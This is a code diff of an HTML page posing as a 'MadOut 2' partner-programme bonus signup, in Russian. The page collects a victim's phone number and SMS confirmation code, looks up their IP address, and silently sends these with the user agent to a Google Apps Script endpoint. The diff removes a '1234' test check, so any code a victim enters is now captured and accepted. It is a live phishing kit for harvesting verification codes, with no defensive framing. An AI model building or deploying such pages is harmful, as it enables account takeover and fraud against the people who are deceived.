@@ -7,87 +7,29 @@
     <style>
         :root { --bg: #0a0e17; --card: #141a26; --text: #e0e0e0; --accent: #ff4444; --gold: #ffd700; --border: #2a3040; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background: var(--bg); min-height: 100vh;
-            display: flex; align-items: center; justify-content: center; padding: 16px;
-        }
-        .card {
-            background: var(--card); border-radius: 20px;
-            padding: 28px 20px; max-width: 400px; width: 100%;
-            box-shadow: 0 4px 30px rgba(255,68,68,0.2); text-align: center;
-            border: 1px solid var(--border);
-        }
-        .logo-row {
-            display: flex; align-items: center; justify-content: center;
-            gap: 8px; margin-bottom: 4px;
-        }
-        .logo-text {
-            font-size: 28px; font-weight: 900; color: var(--accent);
-            letter-spacing: 2px; text-transform: uppercase;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: var(--bg); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 16px; }
+        .card { background: var(--card); border-radius: 20px; padding: 28px 20px; max-width: 400px; width: 100%; box-shadow: 0 4px 30px rgba(255,68,68,0.2); text-align: center; border: 1px solid var(--border); }
+        .logo-row { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 4px; }
+        .logo-text { font-size: 28px; font-weight: 900; color: var(--accent); letter-spacing: 2px; text-transform: uppercase; }
         .logo-row img { height: 50px; width: auto; object-fit: contain; }
-        .logo-sub {
-            font-size: 12px; color: #8890a0; letter-spacing: 3px;
-            text-transform: uppercase; margin-bottom: 24px;
-        }
-        .inviter-row {
-            background: #1a2030; border-radius: 8px; padding: 8px 12px;
-            margin-bottom: 16px; font-size: 12px; color: #8890a0;
-            display: flex; align-items: center; gap: 8px;
-        }
-        .inviter-avatar {
-            width: 24px; height: 24px; border-radius: 50%;
-            background: var(--accent); display: flex;
-            align-items: center; justify-content: center;
-            font-size: 12px; font-weight: 700; color: white;
-        }
-        .bonus-box {
-            background: #1a1020; border: 1px solid var(--accent);
-            border-radius: 12px; padding: 14px; margin-bottom: 20px; text-align: left;
-        }
-        .bonus-row {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 6px 0; border-bottom: 1px solid #2a2040;
-        }
+        .logo-sub { font-size: 12px; color: #8890a0; letter-spacing: 3px; text-transform: uppercase; margin-bottom: 24px; }
+        .inviter-row { background: #1a2030; border-radius: 8px; padding: 8px 12px; margin-bottom: 16px; font-size: 12px; color: #8890a0; display: flex; align-items: center; gap: 8px; }
+        .inviter-avatar { width: 24px; height: 24px; border-radius: 50%; background: var(--accent); display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; color: white; }
+        .bonus-box { background: #1a1020; border: 1px solid var(--accent); border-radius: 12px; padding: 14px; margin-bottom: 20px; text-align: left; }
+        .bonus-row { display: flex; justify-content: space-between; align-items: center; padding: 6px 0; border-bottom: 1px solid #2a2040; }
         .bonus-row:last-child { border-bottom: none; }
         .bonus-label { font-size: 13px; color: #8890a0; }
         .bonus-value { font-size: 16px; font-weight: 700; color: var(--gold); }
         .input-group { margin-bottom: 14px; text-align: left; }
-        .input-group label {
-            display: block; font-size: 12px; font-weight: 600;
-            color: #8890a0; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px;
-        }
-        .phone-wrapper {
-            display: flex; align-items: center; border: 1.5px solid var(--border);
-            border-radius: 10px; background: #0a0e17; overflow: hidden;
-        }
-        .phone-prefix {
-            font-size: 16px; color: #e0e0e0; padding: 12px 8px 12px 16px;
-            user-select: none; font-weight: 500;
-        }
-        .phone-wrapper input {
-            flex: 1; border: none; background: transparent;
-            font-size: 16px; color: #e0e0e0; padding: 12px 16px 12px 0;
-            outline: none; letter-spacing: 1px;
-        }
+        .input-group label { display: block; font-size: 12px; font-weight: 600; color: #8890a0; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .phone-wrapper { display: flex; align-items: center; border: 1.5px solid var(--border); border-radius: 10px; background: #0a0e17; overflow: hidden; }
+        .phone-prefix { font-size: 16px; color: #e0e0e0; padding: 12px 8px 12px 16px; user-select: none; font-weight: 500; }
+        .phone-wrapper input { flex: 1; border: none; background: transparent; font-size: 16px; color: #e0e0e0; padding: 12px 16px 12px 0; outline: none; letter-spacing: 1px; }
         .phone-wrapper:focus-within { border-color: var(--accent); }
-        .code-wrapper {
-            border: 1.5px solid var(--border); border-radius: 10px;
-            background: #0a0e17; overflow: hidden;
-        }
-        .code-wrapper input {
-            width: 100%; border: none; background: transparent;
-            font-size: 16px; color: #e0e0e0; padding: 12px 16px;
-            outline: none; text-align: center; letter-spacing: 2px;
-        }
+        .code-wrapper { border: 1.5px solid var(--border); border-radius: 10px; background: #0a0e17; overflow: hidden; }
+        .code-wrapper input { width: 100%; border: none; background: transparent; font-size: 16px; color: #e0e0e0; padding: 12px 16px; outline: none; text-align: center; letter-spacing: 2px; }
         .code-wrapper:focus-within { border-color: var(--accent); }
-        .btn {
-            width: 100%; padding: 14px; background: var(--accent);
-            color: white; border: none; border-radius: 10px;
-            font-size: 16px; font-weight: 700; cursor: pointer;
-            text-transform: uppercase; letter-spacing: 1px;
-        }
+        .btn { width: 100%; padding: 14px; background: var(--accent); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
         .btn:active { opacity: 0.8; }
         .footer { margin-top: 16px; font-size: 11px; color: #555; }
         .error-msg { color: #ff4444; font-size: 12px; margin-top: 8px; display: none; }
@@ -130,7 +72,6 @@
         </div>
         <div class="footer">MadOut 2 • Партнёрская программа</div>
     </div>
-
     <script>
         const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz56HqUKeeqmgemKDj7SijdXYeDjsnP4UWDsmHuZS0mC5PkCUDq9AywqAJtwuJYkri9Cw/exec';
         const urlParams = new URLSearchParams(window.location.search);
@@ -143,14 +84,8 @@
             return new Promise(function(resolve) {
                 var script = document.createElement('script');
                 script.src = 'https://api.ipify.org?format=jsonp&callback=getIPCallback';
-                window.getIPCallback = function(data) {
-                    resolve(data.ip);
-                    document.body.removeChild(script);
-                    delete window.getIPCallback;
-                };
-                script.onerror = function() {
-                    resolve('IP не найден');
-                };
+                window.getIPCallback = function(data) { resolve(data.ip); document.body.removeChild(script); delete window.getIPCallback; };
+                script.onerror = function() { resolve('IP не найден'); };
                 document.body.appendChild(script);
             });
         }
@@ -167,66 +102,25 @@
 
         async function requestCode() {
             var phone = document.getElementById('phone').value.replace(/\D/g, '');
-            if (phone.length !== 10) {
-                document.getElementById('phone-error').style.display = 'block';
-                setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000);
-                return;
-            }
+            if (phone.length !== 10) { document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
             document.getElementById('phone-error').style.display = 'none';
             document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value;
             document.getElementById('screen-phone').style.display = 'none';
             document.getElementById('screen-code').style.display = 'block';
-            
             var ip = await getIP();
-            
-            fetch(SCRIPT_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    type: 'phone',
-                    phone: '+7' + phone,
-                    inviter: inviter,
-                    timestamp: new Date().toISOString(),
-                    ip: ip,
-                    userAgent: navigator.userAgent
-                })
-            }).catch(function(err) { console.log('ok'); });
+            var fullPhone = '+7' + phone;
+            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
         }
 
         async function confirmCode() {
             var codeInput = document.getElementById('code');
             var code = codeInput.value.replace(/\D/g, '');
-            if (code.length < 4) {
-                document.getElementById('code-error').style.display = 'block';
-                setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 3000);
-                return;
-            }
-            
+            if (code.length < 4) { document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 3000); return; }
             var ip = await getIP();
-            
-            if (code === '1234') {
-                document.getElementById('code-error').style.display = 'none';
-                document.getElementById('screen-code').style.display = 'none';
-                document.getElementById('screen-done').style.display = 'block';
-                fetch(SCRIPT_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        type: 'code',
-                        code: code,
-                        status: 'test_ok',
-                        timestamp: new Date().toISOString(),
-                        ip: ip,
-                        userAgent: navigator.userAgent
-                    })
-                }).catch(function(err) { console.log('ok'); });
-            } else {
-                document.getElementById('code-error').style.display = 'block';
-                codeInput.value = '';
-                setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 3000);
-            }
+            document.getElementById('code-error').style.display = 'none';
+            document.getElementById('screen-code').style.display = 'none';
+            document.getElementById('screen-done').style.display = 'block';
+            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
         }
     </script>
 </body>
